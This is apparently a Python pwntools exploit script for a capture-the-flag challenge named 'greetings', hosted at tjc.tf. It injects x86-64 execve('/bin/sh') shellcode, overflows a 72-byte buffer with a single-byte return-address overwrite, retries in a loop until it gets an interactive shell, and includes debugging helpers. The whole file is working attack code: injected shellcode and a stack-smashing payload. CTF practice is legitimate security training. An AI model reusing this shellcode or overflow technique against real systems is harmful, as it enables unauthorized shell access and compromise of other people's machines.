#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('greetings_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        # b*greetUser+85
        b*greetUser+101
        c
        ''')
        sleep(1)



# nc tjc.tf 31373
while True:
    if args.REMOTE:
        p = remote('tjc.tf', 31373)
    else:
        p = process([exe.path])

    sl(b'72')
    sleep(0.2)

    load = asm(
    """
        add rsp, 0x50
        mov rdi, 29400045130965551
        push rdi
        xor esi, esi
        xor edx, edx
        mov rdi, rsp
        mov eax, 0x3b
        syscall
    """
    )

    sl(load.ljust(72, b'a')+ p8(0x10))
    sl(b'ls')

    try: 
        r(1)
        p.interactive()

    except EOFError:
        p.close()
